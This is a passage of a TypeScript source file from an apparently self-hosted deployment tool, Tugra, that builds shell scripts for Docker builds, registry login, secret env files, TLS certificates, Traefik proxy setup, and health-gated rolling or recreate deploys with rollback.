        `nixpacks build -c ${plan} --cache-key ${shq(app.id)} --name ${tag}${buildEnvFlags} ${base}`,
        `rm -f ${plan} ${plan}.tmp`,
      );
    }
    // Push the freshly-built image to the team registry when requested.
    if (app.registryPush) steps.push(...buildRegistryPushSteps(tag, app.registryPush.tag, app.registryPush.auth));
    return steps;
  }
  // IMAGE: pull upstream (optionally authenticating), then snapshot to the tag.
  const imgSteps = [
    ...registryLoginPrelude(app.registryAuth),
    // `-q` keeps the pull output to a single line so the TUGRA_DIGEST marker below can never be pushed
    // past the agent's 64KB head-capped output buffer by a large multi-layer image's progress noise.
    `docker pull -q ${shq(imageRef(app))}`,
    // Record the immutable upstream digest of what we just pulled (provenance + byte-exact rollback).
    // Best-effort + set-e-safe: a locally-loaded image with no RepoDigests just emits nothing.
    `TUGRA_D=$(docker inspect --format '{{index .RepoDigests 0}}' ${shq(imageRef(app))} 2>/dev/null || true)`,
    `if [ -n "$TUGRA_D" ]; then echo "TUGRA_DIGEST=$TUGRA_D"; fi`,
    `docker tag ${shq(imageRef(app))} ${tag}`,
    ...registryLogoutSteps(app.registryAuth),
  ];
  if (app.registryPush) imgSteps.push(...buildRegistryPushSteps(tag, app.registryPush.tag, app.registryPush.auth));
  return imgSteps;
}

/** Login to a private registry into an isolated DOCKER_CONFIG ($sd), password via stdin. */
export function registryLoginPrelude(auth?: RegistryAuth | null): string[] {
  if (!auth) return [];
  const host = auth.url ? ` ${shq(auth.url)}` : "";
  return [
    ...secretsDirPrelude(),
    'export DOCKER_CONFIG="$sd"',
    `printf %s ${shq(b64(auth.token))} | base64 -d | docker --config "$sd" login${host} -u ${shq(auth.user)} --password-stdin`,
  ];
}

export function registryLogoutSteps(auth?: RegistryAuth | null): string[] {
  if (!auth) return [];
  const host = auth.url ? ` ${shq(auth.url)}` : "";
  return [`docker --config "$sd" logout${host} || true`];
}

export const ENV_DIR = "/etc/tugra/env";

export function envFilePath(app: { id: string }): string {
  return `${ENV_DIR}/${app.id}.env`;
}

/** docker --env-file body: one KEY=VALUE per line (values are literal). */
export function envFileContent(env: Record<string, string>): string {
  return Object.entries(env)
    .map(([k, v]) => `${k}=${v}`)
    .join("\n");
}

/** base64 of the env file, so it can be written on the host without quoting issues. */
export function envFileB64(env: Record<string, string>): string {
  return Buffer.from(envFileContent(env), "utf8").toString("base64");
}

/**
 * Build the deploy script for a specific image version (= deployment id).
 * `build=true` (normal deploy) produces the versioned image first; `build=false`
 * (rollback) skips all prep and just runs the pre-existing versioned tag.
 */
/** Write the app's secrets to a 0600 --env-file (empty when there are no env vars).
 *  Secrets go through a file, never -e, so they never hit the process list. */
function envPreludeFor(app: AppSpec): string[] {
  const env = app.env && typeof app.env === "object" ? app.env : {};
  if (Object.keys(env).length === 0) return [];
  const envPath = envFilePath(app);
  return [
    `mkdir -p ${ENV_DIR}`,
    `printf %s ${shq(envFileB64(env))} | base64 -d > ${envPath}`,
    `chmod 600 ${envPath}`,
  ];
}

/** Ensure the managed-DB network exists before a dbNetwork app's container joins it (idempotent; tolerates
 *  a pruned or never-created network). No-op for a default app, so default deploy scripts stay byte-identical. */
function dbNetPreludeFor(app: AppSpec): string[] {
  return app.dbNetwork ? [`docker network create ${DB_NET} 2>/dev/null || true`] : [];
}

/** Host dir for operator-uploaded custom certs, UNDER PROXY_DYNAMIC_DIR so the proxy (which mounts that
 *  dir read-only at /dynamic) can read them without a second mount. */
const PROXY_CERT_DIR = `${PROXY_DYNAMIC_DIR}/certs`;

/** Traefik file-provider YAML registering one app's uploaded cert. The paths are CONTAINER paths
 *  (/dynamic/...), which is where the proxy reads them from inside its read-only mount. The appId is a
 *  system-generated id (safe to embed). */
export function buildCustomCertYaml(appId: string): string {
  return [
    "tls:",
    "  certificates:",
    `    - certFile: /dynamic/certs/${appId}.crt`,
    `      keyFile: /dynamic/certs/${appId}.key`,
    "",
  ].join("\n");
}

/** Remove one app's uploaded cert (yaml + cert + key) from the proxy's /dynamic. Used by the service when
 *  the cert is cleared, certType leaves "custom", or the app is deleted — removal is NOT in the deploy
 *  script so non-custom deploys stay byte-identical. */
export function buildCustomCertRemoveScript(appId: string): string {
  return [
    "set -e",
    `rm -f ${PROXY_DYNAMIC_DIR}/tls-${appId}.yml ${PROXY_CERT_DIR}/${appId}.crt ${PROXY_CERT_DIR}/${appId}.key`,
  ].join("\n");
}

/** Write an uploaded custom cert into the proxy's /dynamic (atomic temp→mv; key file 0600). Empty for every
 *  app NOT serving an uploaded cert, so default deploy scripts remain byte-identical. Exported so the
 *  compose deploy path writes the same cert files as the docker-run path. */
export function certPreludeFor(app: AppSpec): string[] {
  if (app.certType !== "custom" || !app.certPem || !app.certKey) return [];
  const id = app.id;
  return [
    // 0700 dir + a umask-077 subshell for the key write, so the private key is never world-readable — not
    // even in the brief window between creating the temp file and the mv (chmod-after-write would leave it
    // 0644 until the chmod ran).
    `mkdir -p -m 700 ${PROXY_CERT_DIR}`,
    `printf %s ${shq(b64(app.certPem))} | base64 -d > ${PROXY_CERT_DIR}/.${id}.crt.tmp`,
    `mv ${PROXY_CERT_DIR}/.${id}.crt.tmp ${PROXY_CERT_DIR}/${id}.crt`,
    `(umask 077; printf %s ${shq(b64(app.certKey))} | base64 -d > ${PROXY_CERT_DIR}/.${id}.key.tmp)`,
    `mv ${PROXY_CERT_DIR}/.${id}.key.tmp ${PROXY_CERT_DIR}/${id}.key`,
    `printf %s ${shq(b64(buildCustomCertYaml(id)))} | base64 -d > ${PROXY_DYNAMIC_DIR}/.tls-${id}.yml.tmp`,
    `mv ${PROXY_DYNAMIC_DIR}/.tls-${id}.yml.tmp ${PROXY_DYNAMIC_DIR}/tls-${id}.yml`,
  ];
}

/** The `docker run -d --name <name> ...` line shared by every deploy strategy —
 *  identical flags (net/labels/env/limits/volumes/image) regardless of the container
 *  name, so a rolling container gets the exact same routing as the canonical one. */
function runContainerArgs(app: AppSpec, version: string, name: string): string {
  const ref = runTag(app, version);
  const env = app.env && typeof app.env === "object" ? app.env : {};
  const envArg = Object.keys(env).length > 0 ? `--env-file ${envFilePath(app)}` : "";

  let netExpose: string;
  if (app.domain) {
    const labels = [...traefikLabels(app)];
    // A dbNetwork app is on BOTH tugra-proxy and tugra-net; pin Traefik to the proxy network or it may
    // pick the (proxy-unreachable) tugra-net IP and 502. Only added when the app opts in, so default
    // apps keep byte-identical labels.
    if (app.dbNetwork) labels.push(`traefik.docker.network=${PROXY_NETWORK}`);
    netExpose = `--network ${PROXY_NETWORK} ` + labels.map((l) => `--label ${shq(l)}`).join(" ");
  } else if (app.dbNetwork) {
    // No ingress → run ON the DB network as the sole network (single --network works on any engine), so the
    // app resolves tugra_db_<id> by name. Keep the optional host-port publish.
    netExpose = `--network ${DB_NET}` + (app.hostPort ? ` -p ${app.hostPort}:${app.containerPort ?? 80}` : "");
  } else {
    netExpose = app.hostPort ? `-p ${app.hostPort}:${app.containerPort ?? 80}` : "";
  }

  // Optional resource limits + container health check.
  const limitArgs: string[] = [];
  if (app.memoryMb) limitArgs.push(`--memory ${app.memoryMb}m`);
  if (app.cpus) limitArgs.push(`--cpus ${app.cpus}`);
  // GPU passthrough — the value is validated at the DTO (all | count | device=…) and shell-quoted here.
  if (app.gpus) limitArgs.push(`--gpus ${shq(app.gpus)}`);
  if (app.healthCmd) {
    limitArgs.push(
      `--health-cmd ${shq(app.healthCmd)}`,
      // A 10s interval + 30s start period keeps Docker's health status fresh enough for
      // the deploy gate to observe a healthy transition promptly (a 30s interval only
      // yielded ~2 samples inside the gate window) while tolerating a moderately slow boot
      // without a premature "unhealthy". Longer boots are handled by per-app gate config.
      "--health-interval=10s",
      "--health-timeout=5s",
      "--health-retries=3",
      "--health-start-period=30s",
    );
  }

  // Persistent named volumes (data survives redeploys; auto-created by docker).
  const volArgs = (app.volumes ?? [])
    .map((v) => `-v ${appVolumeName(app, v.name)}:${v.path}`)
    .join(" ");

  // Host bind-mounts (e.g. a media library). The whole `host:ctr[:ro]` value is a user-supplied path, so
  // shell-quote it as ONE word — it can't inject into the `sh -c` deploy command. Paths were validated
  // against the sensitive-path denylist (+ no `:`) before storage, so docker's `-v` parse is unambiguous.
  const hostMountArgs = (app.hostMounts ?? [])
    .map((m) => `-v ${shq(`${m.hostPath}:${m.containerPath}${m.readOnly ? ":ro" : ""}`)}`)
    .join(" ");

  const run = [
    "docker run -d",
    `--name ${name}`,
    "--restart unless-stopped",
    limitArgs.join(" "),
    // Operator-supplied raw flags (advanced) — tokenized + shell-quoted per word so they can't inject
    // shell into the `sh -c` deploy command (host-root RCE); see dockerOptionsArgs.
    dockerOptionsArgs(app.dockerOptions),
    envArg,
    netExpose.trim(),
    volArgs,
    hostMountArgs,
    shq(ref),
  ]
    .filter(Boolean)
    .join(" ");

  // A DOMAIN dbNetwork app ran on tugra-proxy (for ingress); attach tugra-net too — AFTER create, which
  // works on any Docker engine (multiple --network at `docker run` needs Engine 25+). A no-domain dbNetwork
  // app already runs ON tugra-net as its sole network, so it needs no connect.
  //
  // The chain is `run && connect || { rm; false }`: in a `&&` list only the FINAL command triggers `set -e`,
  // so a bare `run && connect` would let a FAILED `docker run` slip past errexit. The trailing `|| { … false }`
  // makes ANY failure (run or connect) remove the half-created container and end non-zero — so set -e aborts
  // a bare use (buildRunScript), and an `if <this>; then` gate (rolling/recreate/relabel/rollback) takes its
  // failure branch with no labelled-but-unreachable container left in rotation.
  return app.dbNetwork && app.domain
    ? `${run} && docker network connect ${DB_NET} ${name} || { docker rm -f ${name} 2>/dev/null; false; }`
    : run;
}

/** Container flags for a one-shot PRE-deploy run: the app's env file (so DATABASE_URL etc. are present),
 *  the managed-DB network when the app is DB-linked (so a migration can reach the DB), and the same
 *  named/host volumes. Deliberately NOT the --name/-p/labels/--restart/health/dockerOptions of the live
 *  container — the hook is a throwaway job, not a second copy of the app in rotation. */
function preDeployContainerArgs(app: AppSpec): string {
  const env = app.env && typeof app.env === "object" ? app.env : {};
  const envArg = Object.keys(env).length > 0 ? `--env-file ${envFilePath(app)}` : "";
  const net = app.dbNetwork ? `--network ${DB_NET}` : "";
  const volArgs = (app.volumes ?? []).map((v) => `-v ${appVolumeName(app, v.name)}:${v.path}`).join(" ");
  const hostMountArgs = (app.hostMounts ?? [])
    .map((m) => `-v ${shq(`${m.hostPath}:${m.containerPath}${m.readOnly ? ":ro" : ""}`)}`)
    .join(" ");
  return [envArg, net, volArgs, hostMountArgs].filter(Boolean).join(" ");
}

/** PRE-deploy hook: run the user command in a one-shot container of the NEW image, BEFORE the swap. Returns
 *  [] when unset so default scripts stay byte-identical. The command runs via `sh -c <shq>` (single-quoted,
 *  so arbitrary multi-line shell is literal — no injection into the deploy `sh -c`). A non-zero exit (hook
 *  failure OR the daemon refusing the run) is normalized to `exit 1` — never 3 (the auto-rollback code) — so
 *  the deploy aborts with the old container still serving. Must be placed under `set -e`, after the env/DB
 *  prelude and BEFORE the first destructive step. */
function preDeploySteps(app: AppSpec, version: string): string[] {
  const cmd = app.preDeployCommand?.trim();
  if (!cmd) return [];
  const args = preDeployContainerArgs(app);
  const ref = runTag(app, version);
  return [
    `echo "TUGRA_PREDEPLOY: running"`,
    `if docker run --rm ${args ? args + " " : ""}--entrypoint sh ${shq(ref)} -c ${shq(cmd)}; then echo "TUGRA_PREDEPLOY: ok"; else echo "TUGRA_PREDEPLOY: failed"; exit 1; fi`,
  ];
}

/** POST-deploy hook, issued as a SEPARATE command AFTER a confirmed-successful classic deploy (so the
 *  delicate health-gate exit paths are left untouched): run the user command INSIDE the now-live container.
 *  Best-effort — the new version is already serving, so a failure is logged via the marker but never rolls
 *  back. The `&& … || …` form always exits 0, so it is safe under either `set -e` or `set +e`. */
export function buildPostDeployScript(app: AppSpec): string {
  const cmd = app.postDeployCommand?.trim() ?? "";
  const name = containerName(app);
  return [
    `echo "TUGRA_POSTDEPLOY: running"`,
    `docker exec ${name} sh -c ${shq(cmd)} && echo "TUGRA_POSTDEPLOY: ok" || echo "TUGRA_POSTDEPLOY: failed (ignored)"`,
  ].join("\n");
}

/**
 * Hard-cutover deploy: `docker rm -f` the old container, then run the new one under
 * the same stable name. Brief downtime during the swap. Used for non-rolling apps
 * (host-port, risky docker options, named volumes) and rollback (build=false).
 */
export function buildRunScript(app: AppSpec, version: string, build = true, noCache = false): string {
  const name = containerName(app);
  return [
    "set -e",
    ...(build ? prepSteps(app, version, noCache) : []),
    ...envPreludeFor(app),
    ...dbNetPreludeFor(app),
    ...certPreludeFor(app),
    ...(build ? preDeploySteps(app, version) : []),
    `docker rm -f ${name} 2>/dev/null || true`,
    runContainerArgs(app, version, name),
    `docker ps --filter name=${name} --format '{{.Status}}'`,
  ].join("\n");
}

/** How to health-check a container before treating a deploy as live. */
export type HealthProbe =
  | { kind: "native" } // the container has a --health-cmd; poll docker's health status
  | { kind: "httpExternal"; port: number; path: string; onHost?: boolean } // pinned probe container; onHost → host network + localhost (host-port apps), else tugra-proxy + container name
  | { kind: "stableWait" }; // no port/health-cmd → require it to stay Running

/** Timing knobs for the health gate. */
export interface HealthGate {
  retries: number;
  intervalSec: number;
  startPeriodSec: number;
}

/**
 * Pick the deploy-gate probe from the app's health-check config. `healthCheckType`:
 * null = auto (a container health-cmd → native; a routed OR host-port app → HTTP; else a
 * liveness wait); "CMD"/"HTTP"/"NONE" force it. An HTTP check reaches a routed app by its
 * container name over tugra-proxy, or a host-port app via localhost on the host network;
 * with neither reachable it degrades to a liveness wait.
 */
export function resolveHealthProbe(app: AppSpec): HealthProbe {
  const type = app.healthCheckType ?? (app.healthCmd ? "CMD" : app.domain ? "HTTP" : "NONE");
  if (type === "CMD") return { kind: "native" };
  if (type === "HTTP") {
    const path = app.healthCheckPath || "/";
    // Routed app: probe its own container on the proxy network (a custom port still only
    // reaches this app's container). Host-port app: probe localhost over the host network —
    // pinned to the app's OWN published port, never an arbitrary one, so it can't be turned
    // into a host-wide localhost port scanner.
    if (app.domain) return { kind: "httpExternal", port: app.healthCheckPort ?? app.containerPort ?? 80, path };
    if (app.hostPort) return { kind: "httpExternal", port: app.hostPort, path, onHost: true };
    return { kind: "stableWait" }; // HTTP configured but no reachable endpoint
  }
  return { kind: "stableWait" }; // NONE
}

/**
 * Shell fragment (runs under `set +e`) that sets `healthy=1` iff the target container
 * passes its probe within the bounded window, else leaves it 0. Guards every probe
 * with `if` so a failed check never aborts the surrounding script.
 */
export function buildHealthGateFragment(target: string, probe: HealthProbe, t: HealthGate): string[] {
  const lines = ["healthy=0", `sleep ${t.startPeriodSec}`];
  if (probe.kind === "native") {
    lines.push(
      `for i in $(seq 1 ${t.retries}); do`,
      `  st=$(docker inspect --format '{{json .State.Health.Status}}' ${target} 2>/dev/null || echo '""')`,
      `  if [ "$st" = '"healthy"' ]; then healthy=1; break; fi`,
      `  if [ "$st" = '"unhealthy"' ]; then break; fi`, // fail fast
      `  sleep ${t.intervalSec}`,
      "done",
    );
  } else if (probe.kind === "httpExternal") {
    // Reach a routed app by its container name over the proxy network; reach a host-port
    // app via localhost on the host network (onHost). "Reachable and serving" = any HTTP
    // response below 500: a booted app commonly answers the probe path with 404 (API root),
    // 401/403 (auth-gated), or 400 (a strict Host allow-list rejecting the container-name
    // Host header) — those must NOT fail the gate. Only a refused/timed-out connection
    // (curl → "000") or a 5xx counts as unhealthy.
    const net = probe.onHost ? "host" : PROXY_NETWORK;
    const host = probe.onHost ? "localhost" : target;
    // Single-quote the URL so the probe path can never break out of the docker-run word
    // even if the path validation is ever loosened (defence-in-depth).
    const url = shq(`http://${host}:${probe.port}${probe.path}`);
    lines.push(
      `for i in $(seq 1 ${t.retries}); do`,
      `  code=$(docker run --rm --network ${net} ${HEALTH_PROBE_IMAGE} -s -o /dev/null -w '%{http_code}' --max-time 5 ${url} 2>/dev/null || echo 000)`,
      `  if [ "$code" != "000" ] && [ "$code" -lt 500 ]; then healthy=1; break; fi`,
      `  sleep ${t.intervalSec}`,
      "done",
    );
  } else {
    // stableWait: already slept the start period; require the container still Running.
    lines.push(`if [ "$(docker inspect --format '{{.State.Running}}' ${target} 2>/dev/null)" = "true" ]; then healthy=1; fi`);
  }
  return lines;
}

/**
 * Zero-downtime rolling deploy for a routed (domain) app. Builds the new image, starts
 * it under a temporary name carrying the SAME Traefik labels (so both versions serve
 * during the overlap), health-gates it, then on success removes the old container and
 * renames the new one into place (exit 0); on failure removes the new container and
 * leaves the old one serving untouched (exit 3 — auto-rollback, zero downtime).
 */
export function buildRollingDeployScript(
  app: AppSpec,
  version: string,
  opts: { build?: boolean; noCache?: boolean; probe: HealthProbe } & HealthGate,
): string {
  const canonical = containerName(app);
  const rollout = rolloutName(app);
  const build = opts.build ?? true;
  // Give the rollout a Traefik LB health check so it stays out of rotation until ready
  // (only meaningful for a routed app; the external probe already gates the cutover).
  const hcPath = opts.probe.kind === "httpExternal" ? opts.probe.path : "/";
  const rApp: AppSpec = { ...app, rollingHealthPath: app.domain ? hcPath : null };
  // Traefik's LB check (its `healthcheck.status` label is a single int, not a range) only counts 2xx/3xx
  // as UP, but the httpExternal gate accepts any code < 500 (404/401/403/400 = booted). Labels are
  // immutable across `docker rename`, so when the gate passed on a >= 400 code the renamed rollout would be
  // marked DOWN by its own check label (every request 503, deploy reported success). In that case re-create
  // the live container from `app` (NO LB-check label) instead of renaming the labelled rollout. `$code` is
  // the passing probe's status (set by the httpExternal gate fragment).
  const relabel =
    opts.probe.kind === "httpExternal"
      ? [
          `  if [ "$code" -ge 400 ]; then`,
          `    docker rm -f ${rollout} 2>/dev/null || true`,
          `    if ${runContainerArgs(app, version, canonical)}; then echo "TUGRA_ROLLOUT: healthy"; exit 0; else echo "TUGRA_ROLLOUT: relabel_failed"; exit 1; fi`,
          "  fi",
        ]
      : [];
  return [
    "set -e",
    ...(build ? prepSteps(app, version, opts.noCache ?? false) : []),
    ...envPreludeFor(app),
    ...dbNetPreludeFor(app),
    ...certPreludeFor(app),
    ...(build ? preDeploySteps(app, version) : []),
    `docker rm -f ${rollout} 2>/dev/null || true`, // clear any stale rollout
    runContainerArgs(rApp, version, rollout),
    "set +e", // the health gate must not abort the script on a failed probe
    ...buildHealthGateFragment(rollout, opts.probe, opts),
    `if [ "$healthy" = 1 ]; then`,
    `  docker rm -f ${canonical} 2>/dev/null || true`,
    ...relabel,
    // Gate success on the rename actually landing — otherwise the live container keeps
    // the temp name and every lifecycle command (stop/start/logs) would miss it.
    `  if docker rename ${rollout} ${canonical}; then echo "TUGRA_ROLLOUT: healthy"; exit 0; else echo "TUGRA_ROLLOUT: rename_failed"; exit 1; fi`,
    "else",
    `  docker rm -f ${rollout} 2>/dev/null || true`, // old container stays; zero downtime
    `  echo "TUGRA_ROLLOUT: rolled_back"; exit 3`,
    "fi",
  ].join("\n");
}

/**
 * Recreate deploy with a health gate + auto-rollback for apps that CANNOT run two
 * containers at once (host-port, custom `--network`/`--name`/`-p`, named volumes, or an
 * explicit RECREATE strategy). Builds the new image, stops the old container, starts the
 * new one under the SAME canonical name, then health-gates it. On success exit 0. On
 * failure it removes the unhealthy new container and — if a previous good image exists —
 * re-runs that image under the canonical name (exit 3, app back on the previous version);
 * with no previous version, or if the rollback re-run itself fails, it exits non-zero so
 * the app is honestly reported FAILED (never a false "kept the previous version").
 *
 * Unlike rolling this has a brief downtime window (old removed before new is gated), which
 * is unavoidable when a temporary overlapping container is impossible.
 */
export function buildRecreateDeployScript(
  app: AppSpec,
  version: string,
  opts: { build?: boolean; noCache?: boolean; prevVersion?: string | null; probe: HealthProbe } & HealthGate,
): string {
  const canonical = containerName(app);
  const build = opts.build ?? true;
  // prevVersion is the previous successful deployment id → its retained image is
  // runTag(app, prevVersion). Re-run it (no rebuild) to restore service.
  const rollback = opts.prevVersion
    ? `  if ${runContainerArgs(app, opts.prevVersion, canonical)}; then echo "TUGRA_ROLLOUT: rolled_back"; exit 3; else echo "TUGRA_ROLLOUT: rollback_failed"; exit 1; fi`
    : `  echo "TUGRA_ROLLOUT: failed"; exit 1`;
  return [
    "set -e",
    ...(build ? prepSteps(app, version, opts.noCache ?? false) : []),
    ...envPreludeFor(app),
    ...dbNetPreludeFor(app),
    ...certPreludeFor(app),
    ...(build ? preDeploySteps(app, version) : []),
    `docker rm -f ${canonical} 2>/dev/null || true`, // stop old (brief downtime begins)
    "set +e", // from here a start/health failure must reach the rollback branch, not abort
    // Guard the start itself: a `docker run` rejected by the daemon (port clash, bad mount,
    // invalid flag, memory below Docker's minimum) must fall through to rollback — under a
    // bare `set -e` it would abort the script and leave the app down with the old container
    // already removed and the previous image never restored.
    `if ${runContainerArgs(app, version, canonical)}; then`,
    ...buildHealthGateFragment(canonical, opts.probe, opts).map((l) => "  " + l),
    "else",
    "  healthy=0", // new container failed to even start → treat as unhealthy
    "fi",
    `if [ "$healthy" = 1 ]; then`,
    `  echo "TUGRA_ROLLOUT: healthy"; exit 0`,
    "else",
    `  docker rm -f ${canonical} 2>/dev/null || true`, // drop the unhealthy/failed new container
    rollback,
    "fi",
  ].join("\n");
}

/** Remove a versioned image by deriving its tag from the deployment id. */
export function buildImageRemoveScript(app: { id: string }, version: string): string {
  return `docker rmi ${runTag(app, version)} 2>/dev/null || true`;
}

/** Remove an image by its exact stored tag — a rollback records the TARGET's tag, not its own
 *  deployment id, so pruning must key off the recorded tag rather than reconstruct it. */
export function buildImageRemoveScriptForTag(tag: string): string {
  return `docker rmi ${shq(tag)} 2>/dev/null || true`;
}

export const PROXY_DNS_ENV_DIR = "/etc/tugra/proxy";
export const PROXY_DNS_ENV_PATH = `${PROXY_DNS_ENV_DIR}/dns.env`;

/**
 * Idempotent setup of the Traefik proxy on a server: always a Let's Encrypt HTTP-01
 * resolver `le`, and — when the server has DNS-01 creds — a second `le-dns` resolver
 * for wildcard certificates. The DNS provider credentials are written to a 0600
 * --env-file (never `-e`/argv), so they never appear on the process list.
 */
export function buildProxySetupScript(
  opts: {
    acmeEmail?: string | null;
    dnsProvider?: string | null;
    dnsCreds?: Record<string, string> | null;
    bind?: string | null;
    // Panel-TLS (DİLİM 1): object => (re)write the panel router file; null => remove it; undefined => leave it.
    panel?: { domain: string; resolver?: PanelResolver } | null;
  } = {},
): string {
  // The panel path demands a real ACME email (no admin@example.com fallback — Let's Encrypt rejects it); the
  // classic app path keeps the fallback so existing http deploys never break.
  const email = opts.panel ? validateAcmeEmail(opts.acmeEmail) : opts.acmeEmail || "admin@example.com";
  const dns =
    opts.dnsProvider && opts.dnsCreds && Object.keys(opts.dnsCreds).length > 0
      ? { provider: opts.dnsProvider, creds: opts.dnsCreds }
      : null;

  // How the proxy binds the host's :80/:443, so Tugra can share a box that already runs
  // something on those ports (e.g. CloudPanel's nginx):
  //  - "public" (default): publish on all interfaces — unchanged behavior.
  //  - "loopback": publish on 127.0.0.1 only — reachable through a front proxy on the box, not from outside.
  //  - "none": publish nothing — the proxy is reachable only on the tugra-proxy docker network, i.e. via the
  //    Cloudflare tunnel (cloudflared hits Traefik by container name); zero open host ports.
  // Traefik's own entrypoints stay on :80/:443 inside the container either way.
  const bind = opts.bind === "loopback" || opts.bind === "none" ? opts.bind : "public";
  const portPublish =
    bind === "none" ? [] : [bind === "loopback" ? "-p 127.0.0.1:80:80 -p 127.0.0.1:443:443" : "-p 80:80 -p 443:443"];

  const runArgs = [
    `docker run -d --name ${PROXY_NAME} --restart unless-stopped`,
    `--network ${PROXY_NETWORK}`,
    ...portPublish,
    "-v /var/run/docker.sock:/var/run/docker.sock:ro",
    "-v /etc/tugra/letsencrypt:/letsencrypt",
    // Panel (+ future dynamic) routers live here, read-only, hot-reloaded by the file provider below.
    `-v ${PROXY_DYNAMIC_DIR}:/dynamic:ro`,
    // DNS creds via a 0600 env-file, never -e — kept off the process list / docker inspect.
    ...(dns ? [`--env-file ${PROXY_DNS_ENV_PATH}`] : []),
    PROXY_IMAGE,
    // Trust-wedge: no phone-home. Traefik checks upstream for a new version + sends anonymous usage by
    // default; both off so a fresh proxy makes zero outbound calls of its own.
    "--global.checknewversion=false",
    "--global.sendanonymoususage=false",
    "--providers.docker=true",
    "--providers.docker.exposedbydefault=false",
    // File provider for the panel router. ALWAYS on (even without a panel) so ANY recreate path keeps an
    // already-written panel.yml; apps keep routing via docker labels.
    "--providers.file.directory=/dynamic",
    "--providers.file.watch=true",
    "--entrypoints.web.address=:80",
    "--entrypoints.websecure.address=:443",
    `--certificatesresolvers.le.acme.email=${shq(email)}`,
    "--certificatesresolvers.le.acme.storage=/letsencrypt/acme.json",
    "--certificatesresolvers.le.acme.httpchallenge=true",
    "--certificatesresolvers.le.acme.httpchallenge.entrypoint=web",
    // Wildcard cert via DNS-01 — separate ACME storage from the HTTP-01 resolver.
    ...(dns
      ? [
          `--certificatesresolvers.le-dns.acme.email=${shq(email)}`,
          "--certificatesresolvers.le-dns.acme.storage=/letsencrypt/acme-dns.json",
          "--certificatesresolvers.le-dns.acme.dnschallenge=true",
          `--certificatesresolvers.le-dns.acme.dnschallenge.provider=${shq(dns.provider)}`,
        ]
      : []),
  ].join(" ");

  // Panel router file: object => atomic write (tmp+mv INSIDE the mounted dir so fsnotify fires); null =>
  // remove; undefined => leave untouched. httpOnly when the proxy publishes no host ports (CF tunnel).
  const panelHttpOnly = bind === "none";
  const panelWriteSteps =
    opts.panel === undefined
      ? []
      : opts.panel === null
        ? [`rm -f ${PROXY_DYNAMIC_DIR}/${PANEL_FILE}`]
        : [
            `printf %s ${shq(
              b64(buildPanelRouterYaml({ domain: opts.panel.domain, resolver: opts.panel.resolver, httpOnly: panelHttpOnly })),
            )} | base64 -d > ${PROXY_DYNAMIC_DIR}/.${PANEL_FILE}.tmp`,
            `mv ${PROXY_DYNAMIC_DIR}/.${PANEL_FILE}.tmp ${PROXY_DYNAMIC_DIR}/${PANEL_FILE}`,
          ];
  // When a panel is configured Traefik must join the dedicated tugra-panel network (attachment is lost on
  // every recreate, so it is re-done here); fail loudly if the network is missing or the attach didn't take.
  const panelConnectSteps = opts.panel
    ? [
        `docker network inspect ${PANEL_NETWORK} >/dev/null 2>&1 || { echo "${PANEL_NETWORK} network missing - run: docker compose up -d" >&2; exit 1; }`,
        `docker network connect ${PANEL_NETWORK} ${PROXY_NAME} 2>/dev/null || true`,
        `docker inspect -f '{{json .NetworkSettings.Networks}}' ${PROXY_NAME} | grep -q ${PANEL_NETWORK} || { echo "proxy failed to attach to ${PANEL_NETWORK}" >&2; exit 1; }`,
      ]
    : [];

  return [
    "set -e",
    `docker network create ${PROXY_NETWORK} 2>/dev/null || true`,
    `docker rm -f ${PROXY_NAME} 2>/dev/null || true`,
    `mkdir -p ${PROXY_DYNAMIC_DIR}`,
    "mkdir -p /etc/tugra/letsencrypt && touch /etc/tugra/letsencrypt/acme.json && chmod 600 /etc/tugra/letsencrypt/acme.json",
    ...(dns
      ? [
          "touch /etc/tugra/letsencrypt/acme-dns.json && chmod 600 /etc/tugra/letsencrypt/acme-dns.json",
          `mkdir -p ${PROXY_DNS_ENV_DIR}`,
          `printf %s ${shq(envFileB64(dns.creds))} | base64 -d > ${PROXY_DNS_ENV_PATH}`,
          `chmod 600 ${PROXY_DNS_ENV_PATH}`,
        ]
      : []),
    ...panelWriteSteps,
    runArgs,
    ...panelConnectSteps,
  ].join("\n");
}

/**
 * Just (re)write or remove the panel router file — for a hot-reload re-apply that must NOT recreate the
 * proxy (no app downtime). The file provider picks the change up via --providers.file.watch.
 */
export function buildPanelRouterWriteScript(
  panel: { domain: string; resolver?: PanelResolver; httpOnly?: boolean } | null,
): string {
  if (panel === null) {
    return ["set -e", `rm -f ${PROXY_DYNAMIC_DIR}/${PANEL_FILE}`].join("\n");
  }
  return [
    "set -e",
    `mkdir -p ${PROXY_DYNAMIC_DIR}`,
    `printf %s ${shq(b64(buildPanelRouterYaml(panel)))} | base64 -d > ${PROXY_DYNAMIC_DIR}/.${PANEL_FILE}.tmp`,
    `mv ${PROXY_DYNAMIC_DIR}/.${PANEL_FILE}.tmp ${PROXY_DYNAMIC_DIR}/${PANEL_FILE}`,
  ].join("\n");
}

/** Stop the Traefik proxy container. */
export function buildProxyStopScript(): string {
  return `docker stop ${PROXY_NAME}`;
}

/** Restart the Traefik proxy container. */
export function buildProxyRestartScript(): string {
  return `docker restart ${PROXY_NAME}`;
}

/** Report the proxy container state ("running"/"exited"/… or "absent"). */
export function buildProxyStatusScript(): string {
  return `docker inspect -f '{{.State.Status}}' ${PROXY_NAME} 2>/dev/null || echo absent`;
}

/** Tail the proxy container logs (combined stdout+stderr). */
export function buildProxyLogsScript(tail = 200): string {
  const n = Math.max(1, Math.min(1000, Math.floor(tail)));
  return `docker logs --tail ${n} ${PROXY_NAME} 2>&1`;
}

export function buildStopScript(app: { id: string }): string {
  return `docker stop ${containerName(app)} 2>/dev/null || true`;
}

/** Start a stopped app container (no rebuild). */
export function buildStartScript(app: { id: string }): string {
  return `docker start ${containerName(app)}`;
}

/** Restart the app container (no rebuild). */
export function buildRestartScript(app: { id: string }): string {
  return `docker restart ${containerName(app)}`;
}

export function buildRemoveScript(app: { id: string }, volumes: AppVolume[] = []): string {
  // Removing an app destroys its container and its named volumes (intentional).
  return [
    `docker rm -f ${containerName(app)} 2>/dev/null || true`,
    ...volumes.map((v) => `docker volume rm ${appVolumeName(app, v.name)} 2>/dev/null || true`),
  ].join("\n");
}
